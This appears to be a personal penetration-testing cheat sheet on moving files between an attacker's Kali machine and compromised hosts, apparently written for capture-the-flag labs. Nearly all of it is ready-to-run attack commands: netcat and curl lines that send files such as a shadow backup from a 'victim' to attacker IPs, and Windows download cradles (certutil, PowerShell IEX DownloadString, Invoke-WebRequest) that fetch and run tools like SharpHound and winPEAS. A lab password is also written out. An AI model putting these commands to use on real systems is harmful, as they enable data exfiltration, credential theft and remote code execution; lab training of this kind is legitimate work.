---
publish: true
created: 2026-02-06T16:51:34.158+05:30
modified: 2026-06-22T08:59:50.904+05:30
---

# Transfer files

## Linux

#### nc

```
# on victim
nc -w 3 10.10.14.4 1235 < /tmp/git.tar

# send to our kali
$ nc -lp 1235 > git.tar
```

#### FTP

- Transfer files using python module - pyftpdlib via FTP.

```
python3 -m pyftpdlib -p 21 -w

ftp 10.10.14.4
anonymous
anonymous
put file
bye
```

##### ftp

```bash

$ ftp username@hostname

password: [just press enter]

$ ftp> binary ## set binary mode for transfering files. alternative : ascii mode

$ ftp> passive ## turn on/off passive

$ ftp> mget * ## gets all files from the remote pwd

$ ftp> mput filename ## puts file in remote directory
```

##### curlftpfs

curlftpfs - to access filesystems over FTP.

```bash

mkdir /mnt/ftp

sudo curlftpfs user@hostname /mnt/ftp

sudo -i

cd /mnt/ftp

sudo umount /mnt/ftp
```

#### dufs - webdav

```
# on kali
$ /home/kali/Downloads/dufs -A -a admin:123@/:rw -b 10.10.16.101 -p 80 ~/htb/sunday/loot

### on machine
## Linux
# using curl
curl -T shadow.backup http://10.10.16.101:80/shadow.backup --user admin:123
# using wget
wget --method=PUT --auth-no-challenge --user=admin --password=123 --body-file=notif.py http://10.10.16.94:80/notif.py -O /dev/null

## Windows
# CMD - curl
curl -T shadow.backup http://10.10.16.101:80/shadow.backup --user admin:123

Invoke-WebRequest -Uri http://linux-ip/upload -Method Put -InFile C:\path\to\file.txt
```

#### SCP

```
sshpass -p 'Welcome2023!' scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip .
```

To download files from remote machine. add `-O` flag to use original SCP instead of SFTP.

```
$ scp max@sorcerer.offsec:/etc/apache2/sites-enabled/000-default.conf /home/kali/
```

to send files to remote machine.

```
scp /home/kali/scp_wrapper.sh max@sorcerer.offsec:/home/max/scp_wrapper.sh
```

### smb

starting a smb server

```
$ impacket-smbserver -smb2support share $(pwd)

# check if its working.
$ smbclient //10.10.16.94/share -N
```

### base64

Transfer a file, by encoding to base64 at source and decoding at destination.

#### From windows to linux

```powershell
$b64 = [Convert]::ToBase64String([IO.FILE]::ReadAllBytes("C:\users\sam.emerson\documents\CVE-2023-28252_Summary.pdf"))
$b64
# copy the text to file (remove any new lines)
base64 -d file > file.pdf
```

#### From linux to linux

```bash
# on kali
cat filename | base64 -w0 | xclip -sel clip

# on target
cat <<EOF | base64 -d > destfilename
///// paste here the base64 encoded file
EOF
```

## Windows

### certutil

Download files using certutil.

```
certutil.exe -urlcache -split -f "http://192.168.45.193/winPEASx64.exe" winPEASx64.exe
```

### Powershell

Download:

#### IEX

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.5:8000/SharpHound.exe')"

powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.5:8000/SharpHound.exe')"
```

```
iwr -uri http://192.168.45.233/SecurityService.exe -outfile SecurityService.exe
```

#### wget

if _wget_ exists.

```
wget http://10.10.16.94:8000/file.exe -outfile file.exe
```
